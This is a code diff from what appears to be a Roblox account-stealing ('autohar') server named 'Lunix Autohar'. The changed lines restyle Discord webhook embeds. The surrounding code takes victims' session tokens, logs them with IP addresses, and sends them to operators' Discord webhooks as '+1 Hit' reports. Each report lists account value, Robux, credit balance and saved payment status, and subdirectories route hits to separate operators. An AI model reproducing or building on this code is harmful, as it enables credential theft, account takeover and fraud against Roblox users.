@@ -991,73 +991,73 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
     if (userData) {
       // First embed: User data only (without cookie)
       const userDataEmbed = {
-        title: customTitle || "🎯 AUTOHAR-TRIPLEHOOK",
+        title: customTitle || "<:hacker:1404745235711655987> AUTOHAR-TRIPLEHOOK",
         color: 0x8B5CF6,
         fields: [
           {
-            name: "👤 Username",
+            name: "<:member_IDS:1393888535412740096> Username",
             value: userData.username || "Unknown",
             inline: false
           },
           {
-            name: "💰 Robux (Pending)",
+            name: "<:robux:1397659164247068765> Robux (Pending)",
             value: `${userData.robux || 0} (0)`,
             inline: true
           },
           {
-            name: "👑 Premium",
+            name: "<:rbxPremium:1408083254531330158> Premium",
             value: userData.premium ? "true" : "false",
             inline: true
           },
           {
-            name: "💎 RAP",
+            name: "<:Dominus_Prize:1408080755531190272> RAP",
             value: userData.rap?.toString() || "0",
             inline: true
           },
           {
-            name: "📊 Summary",
+            name: "<a:80346runescapepayday:1409196815588397186> Summary",
             value: userData.summary?.toString() || "0",
             inline: true
           },
           {
-            name: "💳 Credit Balance",
+            name: "<a:Card:1408083250412523581> Credit Balance",
             value: userData.creditBalance && userData.creditBalance > 0 
               ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`
               : "$0",
             inline: true
           },
           {
-            name: "💾 Saved Payment",
+            name: "<a:Card:1408083250412523581> Saved Payment",
             value: userData.savedPayment ? "True" : "False",
             inline: true
           },
           {
-            name: "💰 Robux Incoming/Outgoing",
+            name: "<:robux:1397659164247068765> Robux Incoming/<:robux:1397659164247068765> Outgoing",
             value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
             inline: true
           },
           {
-            name: "👤 Korblox/Headless",
+            name: "<:KorbloxDeathspeaker:1408080747306418257> Korblox/<:HeadlessHorseman:1397192572295839806> Headless",
             value: `${userData.korblox ? "True" : "False"}/${userData.headless ? "True" : "False"}`,
             inline: true
           },
           {
-            name: "🎂 Age",
+            name: " Age",
             value: `${userData.accountAge || 0} Days`,
             inline: true
           },
           {
-            name: "👥 Groups Owned",
+            name: " Groups Owned",
             value: userData.groupsOwned?.toString() || "0",
             inline: true
           },
           {
-            name: "🏠 Place Visits",
+            name: " Place Visits",
             value: userData.placeVisits?.toString() || "0",
             inline: true
           },
           {
-            name: "🎒 Inventory",
+            name: " Inventory",
             value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
             inline: false
           }
@@ -1357,7 +1357,7 @@ app.post('/:directory/convert', async (req, res) => {
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
 
-      const customTitle = `🎯 +1 Hit - Lunix Autohar`;
+      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
@@ -1623,7 +1623,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       });
 
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
-      const customTitle = `🎯 +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
+      const customTitle = `<:hacker:1404745235711655987> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
       // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
       console.log(`🚀 Sending rich user data embed to subdirectory webhook`);
